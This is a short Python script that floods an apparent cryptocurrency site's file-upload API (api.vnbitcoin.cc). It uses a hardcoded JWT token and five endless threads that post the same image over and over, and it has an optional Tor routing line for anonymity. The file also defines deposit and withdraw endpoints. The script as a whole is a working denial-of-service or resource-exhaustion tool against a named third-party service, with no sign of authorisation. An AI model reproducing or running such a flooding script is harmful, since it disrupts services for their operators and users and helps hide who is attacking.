import requests

#import random
#import string
import threading

from datetime import datetime


base_url = 'https://api.vnbitcoin.cc'
deposit_url = base_url + "/v1/api/paywithdraw"
read_depo_url = base_url + "/v1/api/webgetuserpay"
upload_url = base_url + "/v1/api/uploadFile"

# If you use the Tor
# rt = RequestsTor(tor_ports=(9050,), tor_cport=9051)

files = {'file': ('water_drop.jpg', open('water_drop.jpg', 'rb'))}


def upload():
	headers = {
		"authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTc1ODYsIm5hbWUiOiI4NDAwMDAwMDAwMDMiLCJsZXZlbCI6IiIsImlhdCI6MTY2NTg5NTY5OH0.7W_MzP3-xfA_j-Xv0VVU9ppsixb2Gp3qroU_k8jVPVY"
	}

	resp = requests.post(upload_url, headers=headers, files=files).json()
	print(resp)


upload()


def flood():
	while True:
		now = datetime.now()
		current_time = now.strftime("%H:%M:%S")
		print("Time =", current_time)
		upload()
		now = datetime.now()
		current_time = now.strftime("%H:%M:%S")
		print("Time =", current_time)


# flood()

threads = []

for i in range(5):
	t = threading.Thread(target=flood)
	t.daemon = True
	threads.append(t)


for i in range(5):
	threads[i].start()

for i in range(5):
	threads[i].join()





